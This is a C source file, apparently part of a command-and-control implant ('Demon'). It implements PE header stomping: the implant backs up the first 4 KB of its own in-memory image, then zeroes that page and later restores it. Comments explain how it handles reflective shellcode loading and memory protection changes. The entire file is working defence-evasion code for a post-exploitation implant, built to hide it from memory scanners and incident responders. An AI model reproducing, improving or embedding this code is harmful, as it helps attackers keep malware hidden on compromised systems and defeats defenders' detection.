#include <Demon.h>

#include <common/Macros.h>
#include <core/MiniStd.h>
#include <core/Memory.h>
#include <core/PeProtect.h>

static BYTE PeBackup[ 0x1000 ];
static BOOL PeBackupSaved = FALSE;

VOID PeProtect_Init( VOID )
{
    /* opt-in only - no-op when PE stomping is disabled (ISS-037) */
    if ( ! Instance->Config.Implant.PeStomp )
        return;

    /* verify a valid PE header exists at ModuleBase - in KaynLdr shellcode mode the loader
     * maps sections to a private allocation WITHOUT the PE header, and frees the original
     * blob (which had the header) via FreeReflectiveLoader before DemonInit runs.
     * ModuleBase[0] is the start of .text, not IMAGE_DOS_HEADER. NtProtect on a private
     * region succeeds, so the NT_SUCCESS guard does not help here - MemSet would zero 4 KB
     * of live agent code and crash on the next instruction fetch (ISS-037-shell). */
    PIMAGE_DOS_HEADER DosHdr = ( PIMAGE_DOS_HEADER ) Instance->Session.ModuleBase;
    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
        PUTS( "PeProtect_Init: no PE header at ModuleBase - disabling PeStomp (shellcode mode)" )
        Instance->Config.Implant.PeStomp = FALSE;
        return;
    }

    if ( PeBackupSaved )
        return;

    MmVirtualWrite( NtCurrentProcess(), PeBackup, Instance->Session.ModuleBase, 0x1000 );
    PeBackupSaved = TRUE;
}

VOID PeProtect_Stomp( VOID )
{
    PVOID    BaseAddr   = Instance->Session.ModuleBase;
    NTSTATUS Status     = STATUS_SUCCESS;
    DWORD    OldProtect = 0;
    SIZE_T   StompSize  = 0x1000;

    /* opt-in only - no-op when PE stomping is disabled (ISS-037) */
    if ( ! Instance->Config.Implant.PeStomp )
        return;

    /* SEC_IMAGE VAD pages may reject PAGE_READWRITE in an injected process; bail on failure */
    Status = Instance->Win32.NtProtectVirtualMemory(
        NtCurrentProcess(), &BaseAddr, &StompSize,
        PAGE_READWRITE, &OldProtect );

    if ( ! NT_SUCCESS( Status ) ) {
        PRINTF( "PeProtect_Stomp: NtProtect failed 0x%X - skipping\n", Status )
        return;
    }

    MemSet( BaseAddr, 0, 0x1000 );

    /* reset aliased locals (NtProtect page-aligns in-place); restore to original protection
     * (typically PAGE_READONLY for SEC_IMAGE PE header page, not PAGE_EXECUTE_READ) */
    BaseAddr  = Instance->Session.ModuleBase;
    StompSize = 0x1000;
    Instance->Win32.NtProtectVirtualMemory(
        NtCurrentProcess(), &BaseAddr, &StompSize,
        OldProtect, &OldProtect );
}

VOID PeProtect_Restore( VOID )
{
    PVOID    BaseAddr    = Instance->Session.ModuleBase;
    NTSTATUS Status      = STATUS_SUCCESS;
    DWORD    OldProtect  = 0;
    SIZE_T   RestoreSize = 0x1000;

    /* opt-in only - no-op when PE stomping is disabled (ISS-037) */
    if ( ! Instance->Config.Implant.PeStomp )
        return;

    if ( ! PeBackupSaved )
        return;

    /* bail if the region cannot be made writable */
    Status = Instance->Win32.NtProtectVirtualMemory(
        NtCurrentProcess(), &BaseAddr, &RestoreSize,
        PAGE_READWRITE, &OldProtect );

    if ( ! NT_SUCCESS( Status ) ) {
        PRINTF( "PeProtect_Restore: NtProtect failed 0x%X - skipping\n", Status )
        return;
    }

    MmVirtualWrite( NtCurrentProcess(), BaseAddr, PeBackup, 0x1000 );

    /* reset aliased locals (NtProtect page-aligns in-place); restore to original protection */
    BaseAddr    = Instance->Session.ModuleBase;
    RestoreSize = 0x1000;
    Instance->Win32.NtProtectVirtualMemory(
        NtCurrentProcess(), &BaseAddr, &RestoreSize,
        OldProtect, &OldProtect );
}
